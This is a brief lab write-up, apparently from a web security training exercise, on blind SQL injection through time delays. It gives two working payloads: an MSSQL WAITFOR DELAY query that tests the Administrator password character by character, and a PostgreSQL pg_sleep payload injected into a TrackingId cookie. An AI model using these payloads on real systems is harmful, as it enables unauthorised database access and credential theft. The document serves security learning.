# Blind SQL injection with time delay

1. IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--

This is the query that we will be basing our lab on. Notice because, in this case, there is no error return to us, we use a time delay to tell us if our conditions are true

2. TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

This is the second query that we will use. Basically saying just sleep for 10 seconds if true.
